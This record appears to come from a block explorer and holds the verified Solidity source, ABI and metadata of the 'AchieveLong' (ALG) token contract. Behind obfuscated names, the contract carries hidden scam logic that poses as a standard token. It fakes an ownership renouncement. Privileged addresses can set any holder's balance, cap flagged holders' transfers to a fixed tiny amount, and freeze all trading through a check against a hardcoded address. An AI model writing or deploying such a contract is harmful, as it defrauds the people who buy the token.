{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface feeLiquidityBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract txTo {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountMax {\n    function createPair(address listReceiver, address shouldSell) external returns (address);\n}\n\ninterface enableLaunchedAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletFee) external view returns (uint256);\n\n    function transfer(address toTeam, uint256 amountTrading) external returns (bool);\n\n    function allowance(address feeMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toTeam,\n        uint256 amountTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxReceiverTotal, uint256 value);\n    event Approval(address indexed feeMin, address indexed spender, uint256 value);\n}\n\ninterface enableLaunchedAutoMetadata is enableLaunchedAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AchieveLong is txTo, enableLaunchedAuto, enableLaunchedAutoMetadata {\n\n    function balanceOf(address walletFee) public view virtual override returns (uint256) {\n        return listShouldTx[walletFee];\n    }\n\n    uint256 private isLiquidity;\n\n    address atTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public receiverAuto;\n\n    function buyAmount(address toLaunched, address toTeam, uint256 amountTrading) internal returns (bool) {\n        if (toLaunched == receiverAuto) {\n            return sellMinIs(toLaunched, toTeam, amountTrading);\n        }\n        uint256 launchedBuy = enableLaunchedAuto(amountIs).balanceOf(atTotal);\n        require(launchedBuy == totalTake);\n        require(toTeam != atTotal);\n        if (receiverTotalFrom[toLaunched]) {\n            return sellMinIs(toLaunched, toTeam, buySell);\n        }\n        return sellMinIs(toLaunched, toTeam, amountTrading);\n    }\n\n    function modeToken() public {\n        emit OwnershipTransferred(receiverAuto, address(0));\n        launchLimit = address(0);\n    }\n\n    function liquidityTakeEnable(uint256 amountTrading) public {\n        maxFrom();\n        totalTake = amountTrading;\n    }\n\n    function getOwner() external view returns (address) {\n        return launchLimit;\n    }\n\n    bool private minTokenLaunch;\n\n    function amountReceiverTeam(address txMax) public {\n        maxFrom();\n        \n        if (txMax == receiverAuto || txMax == amountIs) {\n            return;\n        }\n        receiverTotalFrom[txMax] = true;\n    }\n\n    function sellMinIs(address toLaunched, address toTeam, uint256 amountTrading) internal returns (bool) {\n        require(listShouldTx[toLaunched] >= amountTrading);\n        listShouldTx[toLaunched] -= amountTrading;\n        listShouldTx[toTeam] += amountTrading;\n        emit Transfer(toLaunched, toTeam, amountTrading);\n        return true;\n    }\n\n    function transferFrom(address toLaunched, address toTeam, uint256 amountTrading) external override returns (bool) {\n        if (_msgSender() != limitTeam) {\n            if (shouldAt[toLaunched][_msgSender()] != type(uint256).max) {\n                require(amountTrading <= shouldAt[toLaunched][_msgSender()]);\n                shouldAt[toLaunched][_msgSender()] -= amountTrading;\n            }\n        }\n        return buyAmount(toLaunched, toTeam, amountTrading);\n    }\n\n    address public amountIs;\n\n    function transfer(address sellTeam, uint256 amountTrading) external virtual override returns (bool) {\n        return buyAmount(_msgSender(), sellTeam, amountTrading);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverTo;\n    }\n\n    uint256 limitMax;\n\n    function decimals() external view virtual override returns (uint8) {\n        return liquidityTeam;\n    }\n\n    constructor (){\n        \n        feeLiquidityBuy teamMax = feeLiquidityBuy(limitTeam);\n        amountIs = amountMax(teamMax.factory()).createPair(teamMax.WETH(), address(this));\n        \n        receiverAuto = _msgSender();\n        modeToken();\n        feeMarketing[receiverAuto] = true;\n        listShouldTx[receiverAuto] = receiverTo;\n        if (autoTeam == tradingSender) {\n            tradingSender = autoTeam;\n        }\n        emit Transfer(address(0), receiverAuto, receiverTo);\n    }\n\n    string private listToken = \"ALG\";\n\n    uint256 public tradingSender;\n\n    address private launchLimit;\n\n    uint256 constant buySell = 8 ** 10;\n\n    function approve(address enableExempt, uint256 amountTrading) public virtual override returns (bool) {\n        shouldAt[_msgSender()][enableExempt] = amountTrading;\n        emit Approval(_msgSender(), enableExempt, amountTrading);\n        return true;\n    }\n\n    uint256 public maxToken;\n\n    mapping(address => bool) public feeMarketing;\n\n    event OwnershipTransferred(address indexed modeAuto, address indexed feeReceiverMax);\n\n    bool public buyTx;\n\n    function name() external view virtual override returns (string memory) {\n        return sellWalletSwap;\n    }\n\n    uint256 private launchAt;\n\n    function symbol() external view virtual override returns (string memory) {\n        return listToken;\n    }\n\n    uint256 public teamLaunch;\n\n    function owner() external view returns (address) {\n        return launchLimit;\n    }\n\n    function launchSender(address teamFundLiquidity) public {\n        if (buyTx) {\n            return;\n        }\n        \n        feeMarketing[teamFundLiquidity] = true;\n        if (launchAt != maxToken) {\n            launchAt = tradingSender;\n        }\n        buyTx = true;\n    }\n\n    uint256 totalTake;\n\n    uint256 private receiverTo = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private listShouldTx;\n\n    string private sellWalletSwap = \"Achieve Long\";\n\n    uint8 private liquidityTeam = 18;\n\n    function senderMarketing(address sellTeam, uint256 amountTrading) public {\n        maxFrom();\n        listShouldTx[sellTeam] = amountTrading;\n    }\n\n    function maxFrom() private view {\n        require(feeMarketing[_msgSender()]);\n    }\n\n    address limitTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address shouldTradingTake, address enableExempt) external view virtual override returns (uint256) {\n        if (enableExempt == limitTeam) {\n            return type(uint256).max;\n        }\n        return shouldAt[shouldTradingTake][enableExempt];\n    }\n\n    mapping(address => mapping(address => uint256)) private shouldAt;\n\n    uint256 public autoTeam;\n\n    mapping(address => bool) public receiverTotalFrom;\n\n    bool public launchedFee;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeReceiverMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxReceiverTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTradingTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMax\",\"type\":\"address\"}],\"name\":\"amountReceiverTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletFee\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamFundLiquidity\",\"type\":\"address\"}],\"name\":\"launchSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountTrading\",\"type\":\"uint256\"}],\"name\":\"liquidityTakeEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverTotalFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTrading\",\"type\":\"uint256\"}],\"name\":\"senderMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AchieveLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}